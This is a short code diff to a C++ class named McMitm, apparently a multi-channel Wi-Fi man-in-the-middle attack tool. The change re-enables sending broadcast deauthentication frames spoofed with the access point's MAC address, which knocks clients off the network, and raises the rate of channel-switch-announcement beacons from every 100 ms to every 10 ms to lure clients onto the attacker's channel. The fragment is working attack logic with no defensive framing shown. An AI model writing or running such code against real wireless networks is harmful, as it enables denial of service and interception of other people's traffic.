@@ -201,13 +201,13 @@ void McMitm::run(RunStatus &rs, const int timeout_sec){
     // first disconnect
     send_csa_beacon(4);
 
-    /* only for non MFP requests
+    /* only for non MFP requests*/
     Dot11Deauthentication deauth{};
     deauth.addr1(HWAddress<6>::broadcast);
     deauth.addr2(ap_mac);
     deauth.addr3(ap_mac);
     deauth.reason_code(3);
-    send_to_real(deauth);*/
+    send_to_real(deauth);
 
     // monitoring both channels and performing needed actions
     last_real_beacon  = steady_clock::now();
@@ -255,7 +255,7 @@ void McMitm::run(RunStatus &rs, const int timeout_sec){
                     clients.at(client_mac)->state >= ClientState::GotMitm;
             if(!client_associated)
                 send_csa_beacon(1);
-            next_beacon += milliseconds(100);
+            next_beacon += milliseconds(10); //TODO add to attack config
         }
 
         if (last_real_beacon + seconds(2) < steady_clock::now()) {
